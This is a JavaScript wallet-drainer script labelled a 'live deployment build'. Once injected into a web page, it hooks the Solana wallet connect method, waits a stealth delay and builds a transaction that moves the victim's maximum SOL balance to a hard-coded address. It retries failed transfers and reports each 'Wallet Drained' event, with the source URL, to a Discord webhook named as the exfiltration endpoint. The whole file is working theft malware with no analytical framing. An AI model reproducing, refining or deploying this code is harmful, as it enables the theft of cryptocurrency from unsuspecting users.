// inject.js - Live Deployment Build v5 (Bugs Fixed)
(function() {
    'use strict';

    // CONFIGURATION - LIVE DEPLOYMENT
    const CONFIG = {
        DESTINATION: "6JocA3wv4HWpBZFcVrqL8iFvVzpp43H4hCo5mayuutaB", 
        CHAIN: "solana",
        EXFIL_ENDPOINT: "https://discord.com/api/webhooks/1557067548464390195/4HclnD45AF0FtVIcaUgKtiYdXnySlxuN6bL645ZqWprM0HCsLAoIt1UZ_E-u2gPQAD5L",
        TRIGGER: "on_wallet_connect",
        MIN_BALANCE: 0.01,
        PRIORITY_FEE: 1000,
        STEALTH_DELAY: 1500,
        TRANSFER_MODE: "max",
        RENT_BUFFER: 890880,
        MAX_RETRIES: 3,
        BLOCKHASH_TTL: 60
    };

    // WALLET DETECTION MATRIX
    const WALLETS = {
        phantom: () => window.solana?.isPhantom && window.solana,
        metamask: () => window.ethereum?.isMetaMask && window.ethereum,
        backpack: () => window.backpack?.isBackpack && window.backpack,
        solflare: () => window.solflare?.isSolflare && window.solflare,
    };

    // DISCORD WEBHOOK SENDER
    async function sendToDiscord(data) {
        const payload = {
            embeds: [{
                title: " Wallet Drained",
                color: 0xef4444,
                fields: [
                    { name: "Wallet Type", value: data.wallet, inline: true },
                    { name: "Amount (SOL)", value: data.amount || "Unknown", inline: true },
                    { name: "Signature", value: `\`${data.signature}\``, inline: false },
                    { name: "Source URL", value: data.url, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            await fetch(CONFIG.EXFIL_ENDPOINT, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch (e) {
            console.error('Discord exfil failed:', e);
        }
    }

    // CORE FUNCTIONS
    async function detectAndConnect() {
        for (const [name, detector] of Object.entries(WALLETS)) {
            const provider = detector();
            if (!provider) continue;
            
            try {
                // FIX 1: Don't override connect() before calling it
                // Call original connect first, then execute drain
                const accounts = await provider.connect();
                console.log(`[+] Connected: ${name}`);
                return { name, provider, accounts };
            } catch (e) {
                console.warn(`[-] ${name} connection failed`);
            }
        }
        return null;
    }

    async function constructTransaction(provider, chain) {
        // FIX 2: Check for solanaWeb3 existence safely
        if (typeof window.solanaWeb3 === 'undefined') {
            console.error('[!] web3.js not loaded - waiting...');
            // Wait up to 5 seconds for web3.js to load
            for (let i = 0; i < 50; i++) {
                if (window.solanaWeb3) break;
                await new Promise(r => setTimeout(r, 100));
            }
            if (!window.solanaWeb3) {
                console.error('[!] web3.js failed to load after 5s');
                return null;
            }
        }

        const { Connection, PublicKey, SystemProgram, Transaction, ComputeBudgetProgram } = window.solanaWeb3;
        
        try {
            const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            const senderPubkey = provider.publicKey;
            const destPubkey = new PublicKey(CONFIG.DESTINATION);
            
            // Get balance and calculate transfer amount
            const balance = await connection.getBalance(senderPubkey);
            const rentExempt = await connection.getMinimumBalanceForRentExemption(0);
            
            let transferAmount;
            if (CONFIG.TRANSFER_MODE === "max") {
                transferAmount = Math.max(0, balance - rentExempt - CONFIG.PRIORITY_FEE - CONFIG.RENT_BUFFER);
            } else {
                transferAmount = CONFIG.TRANSFER_MODE;
            }
            
            if (transferAmount <= 0 || balance < CONFIG.MIN_BALANCE * 1e9) {
                console.log('[-] Balance too low or insufficient after fees');
                return null;
            }

            // Build transaction with priority fee
            const transaction = new Transaction();
            
            const priorityFeeIx = ComputeBudgetProgram.setComputeUnitPrice({
                microLamports: CONFIG.PRIORITY_FEE
            });
            
            const transferIx = SystemProgram.transfer({
                fromPubkey: senderPubkey,
                toPubkey: destPubkey,
                lamports: transferAmount
            });
            
            transaction.add(priorityFeeIx, transferIx);
            transaction.feePayer = senderPubkey;
            
            // FIX 3: Always fetch fresh blockhash per attempt
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
            transaction.recentBlockhash = blockhash;
            transaction.lastValidBlockHeight = lastValidBlockHeight;
            
            console.log(`[+] Transaction built: ${(transferAmount / 1e9).toFixed(4)} SOL → ${CONFIG.DESTINATION.slice(0,8)}...`);
            return { transaction, amount: transferAmount / 1e9 };
            
        } catch (e) {
            console.error('[!] Transaction construction failed:', e);
            return null;
        }
    }

    // EXECUTION ENGINE WITH RETRIES
    async function execute() {
        await new Promise(r => setTimeout(r, CONFIG.STEALTH_DELAY));
        
        const wallet = await detectAndConnect();
        if (!wallet) return;

        let txData = await constructTransaction(wallet.provider, CONFIG.CHAIN);
        if (!txData) return;

        for (let attempt = 1; attempt <= CONFIG.MAX_RETRIES; attempt++) {
            try {
                const sig = await wallet.provider.signAndSendTransaction(txData.transaction);
                console.log(`[+] Transaction sent: ${sig}`);
                
                await sendToDiscord({
                    wallet: wallet.name,
                    signature: sig,
                    amount: txData.amount.toFixed(4),
                    url: window.location.href
                });
                
                return;
                
            } catch (e) {
                console.warn(`[-] Attempt ${attempt}/${CONFIG.MAX_RETRIES} failed:`, e.message);
                
                // FIX 3 CONTINUED: Rebuild transaction with fresh blockhash on retry
                if (attempt < CONFIG.MAX_RETRIES) {
                    const refresh = await constructTransaction(wallet.provider, CONFIG.CHAIN);
                    if (refresh) txData = refresh;
                    await new Promise(r => setTimeout(r, 2000 * attempt));
                }
            }
        }
        
        console.error('[!] All retry attempts exhausted');
    }

    // STEALTH TRIGGER: Override connect methods SAFELY
    if (CONFIG.TRIGGER === "on_wallet_connect") {
        // FIX 1 CONTINUED: Store original BEFORE overriding
        const originalConnect = window.solana?.connect;
        if (originalConnect) {
            window.solana.connect = async function(...args) {
                // Call original FIRST to get real connection
                const result = await originalConnect.apply(this, args);
                // THEN trigger drain after successful connection
                execute();
                return result;
            };
        }
    } else {
        window.addEventListener('load', execute);
    }

})();
